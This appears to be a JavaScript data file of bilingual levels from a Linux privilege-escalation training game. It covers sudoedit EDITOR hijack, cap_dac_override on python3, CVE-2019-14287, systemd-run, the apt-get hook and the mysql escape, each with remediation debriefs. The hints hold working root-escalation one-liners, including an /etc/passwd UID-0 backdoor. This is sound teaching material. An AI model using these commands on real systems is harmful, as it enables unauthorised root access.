                link: 'https://gtfobins.github.io/gtfobins/node/'
            },
            fr: {
                vuln: 'Mauvaise config sudoers — NOPASSWD sur node',
                why: "node -e exécute un extrait JS en ligne avec les privilèges du processus. require('child_process').spawn() lance /bin/sh comme enfant de ce processus — héritant de root, puisque sudo avait déjà élevé node en root avant l'exécution du script.",
                fix: "Ne jamais donner sudo sur un runtime généraliste (node, python, perl...). Encapsule la tâche légitime dans un script fixe non modifiable et donne sudo sur ce script précis à la place.",
                link: 'https://gtfobins.github.io/gtfobins/node/'
            }
        }
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 26 — sudoedit / sudo -e: $EDITOR hijack
    // ─────────────────────────────────────────────────────────────
    {
        id: 26,
        codename: 'box-26',
        title: { en: 'Box-26 · The Editor\'s Trust', fr: "Box-26 · La confiance de l'éditeur" },
        brief: {
            en: "sudoedit lets you edit /etc/motd as root without ever running /etc/motd itself. But it does that by forking your own $EDITOR — and sudoers kept EDITOR set.",
            fr: "sudoedit te permet d'éditer /etc/motd en root sans jamais exécuter /etc/motd lui-même. Mais pour ça, il lance ton propre $EDITOR — et sudoers a conservé la variable EDITOR."
        },
        user: 'player',
        host: 'box-26',
        cwd: '/home/player',
        objectives: {
            en: ['Check your sudo permissions', 'Notice EDITOR is kept across sudo', 'Point EDITOR at your own script before running sudoedit'],
            fr: ["Vérifier tes droits sudo", "Remarquer qu'EDITOR est conservée à travers sudo", "Pointer EDITOR vers ton propre script avant de lancer sudoedit"]
        },
        hints: {
            en: [
                'Try: sudo -l — look at the env_keep line, not just the command list.',
                'sudoedit never runs the target file as root — it runs $EDITOR on a scratch copy of it, as root.',
                'Write a one-line shell script, chmod +x it, then: sudo EDITOR=/path/to/script -e /etc/motd'
            ],
            fr: [
                "Essaie : sudo -l — regarde la ligne env_keep, pas juste la liste des commandes.",
                "sudoedit n'exécute jamais le fichier cible en root — il lance $EDITOR sur une copie temporaire, en root.",
                'Écris un script shell d\'une ligne, chmod +x, puis : sudo EDITOR=/chemin/script -e /etc/motd'
            ]
        },
        flag: 'flag{sud0edit_ed1tor_pwn}',
        env_keep: ['EDITOR'],
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'sudoers', 'motd'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/etc/sudoers': { type: 'file', owner: 'root', mode: '440', content: 'ACCESS DENIED' },
            '/etc/motd': { type: 'file', owner: 'root', mode: '644', content: 'Welcome to box-26.\n' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{sud0edit_ed1tor_pwn}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'sudo', 'sudoedit'] },
            '/usr/bin/ls': ELF_BIN(),
            '/usr/bin/cat': ELF_BIN(),
            '/usr/bin/sh': ELF_BIN(),
            '/usr/bin/bash': ELF_BIN(),
            '/usr/bin/sudo': SUID_BIN(),
            '/usr/bin/sudoedit': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        sudoers: {
            player: [
                { cmd: 'sudoedit /etc/motd', nopasswd: true, runas: 'root' }
            ]
        },
        wins: [
            { type: 'sudoedit_editor' }
        ],
        debrief: {
            en: {
                vuln: 'sudoedit / sudo -e with EDITOR preserved in env_keep',
                why: "sudoedit is designed to be safer than 'sudo vim file' — it never runs the target file with elevated rights. Instead it copies it somewhere writable and opens *your* $EDITOR on that copy, as root, then copies the result back. If sudoers kept EDITOR in env_keep, that editor can be any executable you choose — a one-line script that just execs a shell is enough.",
                fix: "Never keep EDITOR/VISUAL in env_keep for a sudoedit rule — that reintroduces exactly the risk sudoedit exists to avoid. If a fixed editor is required, hardcode it in the sudoers rule (e.g. via an env_keep-free wrapper) instead of trusting the invoker's environment.",
                link: 'https://gtfobins.github.io/gtfobins/sudo/#sudoedit'
            },
            fr: {
                vuln: 'sudoedit / sudo -e avec EDITOR conservée en env_keep',
                why: "sudoedit est censé être plus sûr que 'sudo vim fichier' — il n'exécute jamais le fichier cible avec des droits élevés. Il le copie dans un emplacement modifiable et ouvre *ton* $EDITOR sur cette copie, en root, puis recopie le résultat. Si sudoers a gardé EDITOR en env_keep, cet éditeur peut être n'importe quel exécutable de ton choix — un script d'une ligne qui lance juste un shell suffit.",
                fix: "Ne jamais garder EDITOR/VISUAL en env_keep pour une règle sudoedit — ça réintroduit exactement le risque que sudoedit est censé éviter. Si un éditeur fixe est nécessaire, code-le en dur dans la règle sudoers (par ex. via un wrapper sans env_keep) plutôt que de faire confiance à l'environnement de l'appelant.",
                link: 'https://gtfobins.github.io/gtfobins/sudo/#sudoedit'
            }
        }
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 27 — cap_dac_override+ep on python3: bypass write DAC, backdoor /etc/passwd
    // ─────────────────────────────────────────────────────────────
    {
        id: 27,
        codename: 'box-27',
        title: { en: 'Box-27 · Override', fr: 'Box-27 · Outrepasser' },
        brief: {
            en: '/etc/passwd is locked down and there\'s no sudo here. But python3 was granted cap_dac_override — the capability that bypasses discretionary write checks entirely, not just reads.',
            fr: "/etc/passwd est verrouillé et il n'y a pas de sudo ici. Mais python3 a reçu cap_dac_override — la capability qui contourne totalement les vérifications d'écriture, pas seulement la lecture."
        },
        user: 'player',
        host: 'box-27',
        cwd: '/home/player',
        objectives: {
            en: ['Find the capability with getcap', 'Understand why this one is worse than a read-only bypass', 'Append a UID-0 backdoor line to /etc/passwd', 'su into it'],
            fr: ["Trouver la capability avec getcap", "Comprendre pourquoi celle-ci est pire qu'un simple contournement de lecture", "Ajouter une ligne backdoor UID 0 à /etc/passwd", "Basculer dessus avec su"]
        },
        hints: {
            en: [
                'Try: getcap -r / 2>/dev/null',
                'cap_dac_override bypasses discretionary access control for both reads AND writes — cap_dac_read_search (seen elsewhere) only ever covers reads.',
                'python3 -c "open(\'/etc/passwd\',\'a\').write(\'pwnd::0:0::/root:/bin/bash\\n\')" then: su pwnd'
            ],
            fr: [
                'Essaie : getcap -r / 2>/dev/null',
                "cap_dac_override contourne le contrôle d'accès discrétionnaire aussi bien en lecture qu'en écriture — cap_dac_read_search (vu ailleurs) ne couvre que la lecture.",
                'python3 -c "open(\'/etc/passwd\',\'a\').write(\'pwnd::0:0::/root:/bin/bash\\n\')" puis : su pwnd'
            ]
        },
        flag: 'flag{dac_0verride_pwn}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{dac_0verride_pwn}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['python3', 'ls', 'cat', 'sh', 'bash', 'getcap', 'setcap'] },
            '/usr/bin/python3': { type: 'file', owner: 'root', mode: '755', capabilities: 'cap_dac_override+ep', content: 'ELF binary' },
            '/usr/bin/ls': ELF_BIN(),
            '/usr/bin/cat': ELF_BIN(),
            '/usr/bin/sh': ELF_BIN(),
            '/usr/bin/bash': ELF_BIN(),
            '/usr/bin/getcap': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/setcap': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        wins: [
            { type: 'passwd_write' }
        ],
        harden: {
            type: 'unset_cap', target: '/usr/bin/python3',
            obj: { en: 'Strip the cap_dac_override capability from python3', fr: 'Retire la capability cap_dac_override de python3' },
            hint: { en: 'setcap -r /usr/bin/python3', fr: 'setcap -r /usr/bin/python3' }
        },
        debrief: {
            en: {
                vuln: 'Linux capability cap_dac_override+ep on python3',
                why: "cap_dac_read_search (seen on other boxes) only ever bypasses read and directory-traversal checks — real Linux never lets it write. cap_dac_override is the strictly larger capability: it bypasses discretionary access control for both reads and writes. A one-line open(path, 'a').write(...) in python3 appends straight to /etc/passwd — root-owned, mode 644 — despite the player having no write permission on it at all. Appending a UID-0 line with an empty password field creates an instant, password-less root account.",
                fix: 'Remove unnecessary capabilities with setcap -r /usr/bin/python3, and treat cap_dac_override on any interpreter or file-handling tool as full root — it is, for filesystem purposes, indistinguishable from being root. Audit with getcap -r / regularly, and never grant DAC_OVERRIDE to a general-purpose interpreter.',
                link: 'https://man7.org/linux/man-pages/man7/capabilities.7.html'
            },
            fr: {
                vuln: 'Capability Linux cap_dac_override+ep sur python3',
                why: "cap_dac_read_search (vu sur d'autres box) ne contourne que la lecture et la traversée de dossier — jamais l'écriture. cap_dac_override est la capability strictement plus large : elle contourne le contrôle d'accès discrétionnaire aussi bien en lecture qu'en écriture. Un simple open(chemin, 'a').write(...) en python3 ajoute directement à /etc/passwd — appartenant à root, mode 644 — alors que le joueur n'a aucune permission d'écriture dessus. Ajouter une ligne UID 0 avec un champ mot de passe vide crée un compte root instantané et sans mot de passe.",
                fix: 'Retire les capabilities inutiles avec setcap -r /usr/bin/python3, et traite cap_dac_override sur un interpréteur ou un outil de manipulation de fichiers comme un accès root complet — c\'est, du point de vue du système de fichiers, indiscernable de root. Audite régulièrement avec getcap -r /, et ne donne jamais DAC_OVERRIDE à un interpréteur généraliste.',
                link: 'https://man7.org/linux/man-pages/man7/capabilities.7.html'
            }
        }
    },
    // ─────────────────────────────────────────────────────────────
    // LEVEL 28 — CVE-2019-14287: sudo "(ALL, !root)" negative-uid bypass
    // ─────────────────────────────────────────────────────────────
    {
        id: 28,
        codename: 'box-28',
        title: { en: 'Box-28 · Minus One', fr: 'Box-28 · Moins un' },
        brief: {
            en: "sudo -l says you can run /bin/bash as anyone except root. Sounds safe — except old sudo has a bug about how \"except root\" actually gets checked.",
            fr: "sudo -l dit que tu peux lancer /bin/bash en tant que n'importe qui sauf root. Ça semble sûr — sauf que les vieilles versions de sudo ont un bug dans la façon dont \"sauf root\" est vraiment vérifié."
        },
        user: 'player',
        host: 'box-28',
        cwd: '/home/player',
        objectives: {
            en: ['Check sudo -l and read the exclusion carefully', 'Confirm -u root is really blocked', 'Find the uid that bypasses a name-only exclusion', 'Get a root shell'],
            fr: ["Vérifier sudo -l et bien lire l'exclusion", 'Confirmer que -u root est vraiment bloqué', "Trouver l'uid qui contourne une exclusion basée uniquement sur le nom", 'Obtenir un shell root']
        },
        hints: {
            en: [
                'sudo -l — read the "(ALL, !root)" part closely. It excludes a user by name.',
                'sudo -u root /bin/bash still gets refused — the exclusion does catch the literal name.',
                'This is CVE-2019-14287: try sudo -u#-1 /bin/bash (or the uint32 wraparound, sudo -u#4294967295 /bin/bash).'
            ],
            fr: [
                'sudo -l — lis bien la partie "(ALL, !root)". Ça exclut un utilisateur par son nom.',
                'sudo -u root /bin/bash est toujours refusé — l\'exclusion attrape bien le nom littéral.',
                "C'est le CVE-2019-14287 : essaie sudo -u#-1 /bin/bash (ou le débordement uint32, sudo -u#4294967295 /bin/bash)."
            ]
        },
        flag: 'flag{sudo_negative_uid_cve201914287}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{sudo_negative_uid_cve201914287}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh'] },
            '/usr/bin/ls': ELF_BIN(),
            '/usr/bin/cat': ELF_BIN(),
            '/usr/bin/sh': ELF_BIN(),
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['bash', 'sh'] },
            '/bin/bash': ELF_BIN(),
            '/bin/sh': ELF_BIN()
        },
        sudoers: {
            player: [
                { cmd: '/bin/bash', nopasswd: true, runas: 'ALL, !root', runasExcept: 'root' }
            ]
        },
        wins: [
            { type: 'sudo_negative_uid' }
        ],
        debrief: {
            en: {
                vuln: 'sudo "(ALL, !root)" runas exclusion — CVE-2019-14287',
                why: "The sudoers rule reads as safe: run /bin/bash as any user, but never as root. And sudo -u root really is refused. The bug is in how versions before 1.8.28 resolve a numeric target: -u#-1 (or its unsigned-32-bit wraparound, -u#4294967295) never gets compared against the literal string \"root\" during the policy check, so the exclusion never fires — but the resulting setresuid() call still lands on uid 0, because -1 cast to uid_t is 0. The name-based blocklist and the actual privilege the kernel grants are two different things, and this bug lived in that gap.",
                fix: "Upgrade to sudo >= 1.8.28, where negative/overflowed uids are rejected outright. Structurally, prefer an explicit allowlist of runas users over an \"ALL except\" exclusion — a positive list has nothing for a uid trick to sneak past. Audit with sudo -l and treat any \"!user\" exclusion pattern as a red flag worth a version check.",
                link: 'https://nvd.nist.gov/vuln/detail/CVE-2019-14287'
            },
            fr: {
                vuln: 'Exclusion "runas" sudo "(ALL, !root)" — CVE-2019-14287',
                why: "La règle sudoers semble sûre : lancer /bin/bash en tant que n'importe qui, mais jamais root. Et sudo -u root est bien refusé. Le bug est dans la façon dont les versions antérieures à 1.8.28 résolvent une cible numérique : -u#-1 (ou son débordement en entier 32 bits non signé, -u#4294967295) n'est jamais comparé à la chaîne littérale \"root\" pendant la vérification de la policy, donc l'exclusion ne se déclenche jamais — mais l'appel setresuid() qui suit aboutit quand même à l'uid 0, car -1 casté en uid_t vaut 0. La liste d'exclusion basée sur le nom et le privilège réellement accordé par le noyau sont deux choses différentes, et ce bug vivait exactement dans cet écart.",
                fix: "Mets à jour vers sudo >= 1.8.28, qui rejette directement les uid négatifs ou en débordement. Structurellement, préfère une liste blanche explicite d'utilisateurs runas à une exclusion \"ALL sauf\" — une liste positive ne laisse aucune place à une astuce d'uid pour se glisser entre les mailles. Audite avec sudo -l et traite tout motif d'exclusion \"!utilisateur\" comme un signal à vérifier côté version.",
                link: 'https://nvd.nist.gov/vuln/detail/CVE-2019-14287'
            }
        }
    },
    // ─────────────────────────────────────────────────────────────
    // LEVEL 29 — sudo systemd-run (GTFOBins: transient unit runs as root)
    // ─────────────────────────────────────────────────────────────
    {
        id: 29,
        codename: 'box-29',
        title: { en: 'Box-29 · Run As A Service', fr: 'Box-29 · Lancé comme un service' },
        brief: {
            en: 'sudo -l grants systemd-run, nothing else. It looks harmless — it just launches services. But services are managed by a process that runs as root.',
            fr: "sudo -l n'accorde que systemd-run, rien d'autre. Ça semble inoffensif — ça ne fait que lancer des services. Mais les services sont gérés par un processus qui tourne en root."
        },
        user: 'player',
        host: 'box-29',
        cwd: '/home/player',
        objectives: {
            en: ['Check sudo -l', 'Understand who actually runs a systemd unit', 'Launch a transient shell unit as root'],
            fr: ['Vérifier sudo -l', 'Comprendre qui exécute réellement une unité systemd', 'Lancer une unité transitoire shell en root']
        },
        hints: {
            en: [
                'sudo -l — systemd-run is allowed. Check GTFOBins for "systemd-run".',
                'systemd-run talks to the system manager (PID 1) to schedule a transient unit — that manager runs as root, not as you.',
                'sudo systemd-run /bin/sh — the unit\'s command runs as root regardless of who invoked systemd-run.'
            ],
            fr: [
                'sudo -l — systemd-run est autorisé. Regarde GTFOBins pour "systemd-run".',
                "systemd-run parle au gestionnaire système (PID 1) pour planifier une unité transitoire — ce gestionnaire tourne en root, pas avec tes droits.",
                "sudo systemd-run /bin/sh — la commande de l'unité s'exécute en root, peu importe qui a invoqué systemd-run."
            ]
        },
        flag: 'flag{systemd_run_sudo_pwn}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{systemd_run_sudo_pwn}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'systemd-run'] },
            '/usr/bin/ls': ELF_BIN(),
            '/usr/bin/cat': ELF_BIN(),
            '/usr/bin/sh': ELF_BIN(),
            '/usr/bin/systemd-run': ELF_BIN(),
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': ELF_BIN()
        },
        sudoers: {
            player: [
                { cmd: '/usr/bin/systemd-run', nopasswd: true, runas: 'root' }
            ]
        },
        wins: [
            { type: 'sudo_shell' }
        ],
        debrief: {
            en: {
                vuln: 'Sudoers NOPASSWD on systemd-run (GTFOBins)',
                why: 'systemd-run doesn\'t run your command directly — it hands a job description to the system manager (PID 1) over D-Bus, and that manager schedules and executes it. sudo only gets systemd-run itself in the door; the manager it talks to already runs as root, so the transient unit it schedules runs as root too, independent of who called systemd-run. Any binary that ultimately hands execution off to a privileged daemon has the same shape of risk as a direct root shell.',
                fix: 'Never grant systemd-run (or any service-manager client) via sudo unless the target is fully trusted with root — there is no safe restricted subset of it. Prefer polkit-scoped, unit-specific permissions (systemctl start/stop on one named unit) over a blanket systemd-run grant, and check GTFOBins before writing any new sudoers rule.',
                link: 'https://gtfobins.github.io/gtfobins/systemd-run/'
            },
            fr: {
                vuln: 'NOPASSWD sudoers sur systemd-run (GTFOBins)',
                why: "systemd-run n'exécute pas directement ta commande — il transmet une description de job au gestionnaire système (PID 1) via D-Bus, et c'est ce gestionnaire qui la planifie et l'exécute. sudo ne fait entrer que systemd-run lui-même ; le gestionnaire auquel il parle tourne déjà en root, donc l'unité transitoire qu'il planifie tourne en root aussi, indépendamment de qui a appelé systemd-run. Tout binaire qui finit par déléguer l'exécution à un démon privilégié porte le même risque qu'un accès root direct.",
                fix: "N'accorde jamais systemd-run (ni aucun client d'un gestionnaire de services) via sudo, sauf si la cible est entièrement digne de confiance avec root — il n'existe aucun sous-ensemble restreint sûr. Préfère des permissions scoppées via polkit, spécifiques à une unité (systemctl start/stop sur une unité nommée) plutôt qu'un accès systemd-run général, et vérifie GTFOBins avant d'écrire toute nouvelle règle sudoers.",
                link: 'https://gtfobins.github.io/gtfobins/systemd-run/'
            }
        }
    },
    // ─────────────────────────────────────────────────────────────
    // LEVEL 30 — sudo apt-get (GTFOBins: -o config override runs a hook as root)
    // ─────────────────────────────────────────────────────────────
    {
        id: 30,
        codename: 'box-30',
        title: { en: 'Box-30 · Update Hook', fr: 'Box-30 · Le hook de mise à jour' },
        brief: {
            en: 'sudo -l grants apt-get, nothing else — a package manager, not an interpreter. But apt-get lets you override its config from the command line, including which commands it runs before an update.',
            fr: "sudo -l n'accorde qu'apt-get, rien d'autre — un gestionnaire de paquets, pas un interpréteur. Mais apt-get permet de surcharger sa config en ligne de commande, y compris quelles commandes il exécute avant une mise à jour."
        },
        user: 'player',
        host: 'box-30',
        cwd: '/home/player',
        objectives: {
            en: ['Check sudo -l', 'Look up apt-get on GTFOBins', 'Override the Pre-Invoke hook to run a shell'],
            fr: ['Vérifier sudo -l', 'Chercher apt-get sur GTFOBins', 'Surcharger le hook Pre-Invoke pour lancer un shell']
        },
        hints: {
            en: [
                'sudo -l — apt-get is allowed. Check GTFOBins for "apt-get" or "apt".',
                'apt-get -o lets you set arbitrary config keys for this run only, including hook commands normally set in /etc/apt/apt.conf.',
                'sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh — the hook runs before apt-get does anything else, as root.'
            ],
            fr: [
                'sudo -l — apt-get est autorisé. Regarde GTFOBins pour "apt-get" ou "apt".',
                "apt-get -o permet de fixer n'importe quelle clé de config pour cette exécution, y compris les commandes de hook normalement définies dans /etc/apt/apt.conf.",
                'sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh — le hook s\'exécute avant tout le reste d\'apt-get, en root.'
            ]
        },
        flag: 'flag{apt_get_preinvoke_pwn}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{apt_get_preinvoke_pwn}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'apt-get'] },
            '/usr/bin/ls': ELF_BIN(),
            '/usr/bin/cat': ELF_BIN(),
            '/usr/bin/sh': ELF_BIN(),
            '/usr/bin/apt-get': ELF_BIN(),
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': ELF_BIN()
        },
        sudoers: {
            player: [
                { cmd: '/usr/bin/apt-get', nopasswd: true, runas: 'root' }
            ]
        },
        wins: [
            { type: 'sudo_shell' }
        ],
        debrief: {
            en: {
                vuln: 'Sudoers NOPASSWD on apt-get (GTFOBins config-override hook)',
                why: "apt-get isn't a shell or an interpreter, so a NOPASSWD grant on it looks conservative. But apt-get -o lets the caller set any configuration key for that run, including the *Pre-Invoke hooks normally reserved for /etc/apt/apt.conf. APT::Update::Pre-Invoke runs its value as a shell command before the update itself does anything — and since apt-get is running as root under sudo, so does the hook. The package manager was never the risk; its unrestricted configuration surface was.",
                fix: 'Never grant a package manager via sudo without restricting arguments (sudoers supports per-argument rules, e.g. limiting to `apt-get update` with no `-o`/`-c` allowed) — a bare NOPASSWD on the binary path hands over every flag it supports, including config overrides. Check GTFOBins before writing any sudoers rule for a tool you have not audited for a "config injection" style escape.',
                link: 'https://gtfobins.github.io/gtfobins/apt-get/'
            },
            fr: {
                vuln: "NOPASSWD sudoers sur apt-get (hook de surcharge de config, GTFOBins)",
                why: "apt-get n'est ni un shell ni un interpréteur, donc un accès NOPASSWD dessus paraît raisonnable. Mais apt-get -o permet à l'appelant de fixer n'importe quelle clé de configuration pour cette exécution, y compris les hooks *Pre-Invoke normalement réservés à /etc/apt/apt.conf. APT::Update::Pre-Invoke exécute sa valeur comme une commande shell avant même que la mise à jour ne commence — et comme apt-get tourne en root sous sudo, le hook aussi. Le gestionnaire de paquets n'a jamais été le risque ; sa surface de configuration sans restriction l'était.",
                fix: "N'accorde jamais un gestionnaire de paquets via sudo sans restreindre les arguments (sudoers permet des règles par argument, par exemple limiter à `apt-get update` sans autoriser `-o`/`-c`) — un NOPASSWD nu sur le chemin du binaire donne accès à tous les flags qu'il supporte, y compris les surcharges de config. Vérifie GTFOBins avant d'écrire une règle sudoers pour un outil que tu n'as pas audité pour ce type de contournement par injection de config.",
                link: 'https://gtfobins.github.io/gtfobins/apt-get/'
            }
        }
    },
    // ─────────────────────────────────────────────────────────────
    // LEVEL 31 — sudo mysql \! (GTFOBins: client-builtin shell escape)
    // ─────────────────────────────────────────────────────────────
    {
        id: 31,
        codename: 'box-31',
        title: { en: 'Box-31 · Query Escape', fr: 'Box-31 · Échappement de requête' },
        brief: {
            en: "sudo -l grants mysql, nothing else — a database client. It just runs queries... except its interactive shell has a builtin escape command that has nothing to do with SQL.",
            fr: "sudo -l n'accorde que mysql, rien d'autre — un client de base de données. Il ne fait qu'exécuter des requêtes... sauf que son shell interactif a une commande d'échappement intégrée qui n'a rien à voir avec le SQL."
        },
        user: 'player',
        host: 'box-31',
        cwd: '/home/player',
        objectives: {
            en: ['Check sudo -l', 'Look up mysql on GTFOBins', 'Use the client\'s shell-escape builtin to get root'],
            fr: ['Vérifier sudo -l', 'Chercher mysql sur GTFOBins', "Utiliser la commande d'échappement du client pour obtenir root"]
        },
        hints: {
            en: [
                'sudo -l — mysql is allowed. Check GTFOBins for "mysql".',
                'The mysql CLI has builtin commands starting with \\ — one of them runs an arbitrary shell command.',
                'sudo mysql -e \'\\! /bin/sh\' — the \\! escape runs outside the SQL engine, as whoever mysql is running as.'
            ],
            fr: [
                'sudo -l — mysql est autorisé. Regarde GTFOBins pour "mysql".',
                "Le CLI mysql a des commandes intégrées qui commencent par \\ — l'une d'elles exécute une commande shell arbitraire.",
                'sudo mysql -e \'\\! /bin/sh\' — l\'échappement \\! s\'exécute en dehors du moteur SQL, avec les droits de celui qui fait tourner mysql.'
            ]
        },
        flag: 'flag{mysql_bang_escape_pwn}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{mysql_bang_escape_pwn}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'mysql'] },
            '/usr/bin/ls': ELF_BIN(),
            '/usr/bin/cat': ELF_BIN(),
            '/usr/bin/sh': ELF_BIN(),
            '/usr/bin/mysql': ELF_BIN(),
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': ELF_BIN()
        },
        sudoers: {
            player: [
                { cmd: '/usr/bin/mysql', nopasswd: true, runas: 'root' }
            ]
        },
        wins: [
            { type: 'sudo_shell' }
        ],
        debrief: {
            en: {
                vuln: 'Sudoers NOPASSWD on mysql (GTFOBins client shell-escape builtin)',
                why: "A database client feels safely far from a shell — its whole job is running SQL. But the mysql CLI's interactive mode has its own command language on top of SQL, prefixed with \\, and \\! is defined as \"execute a shell command\". It was built as a convenience for administrators switching between SQL and shell mid-session, not as a privilege boundary — so when mysql itself is running as root under sudo, \\! hands you a root shell with no SQL involved at all.",
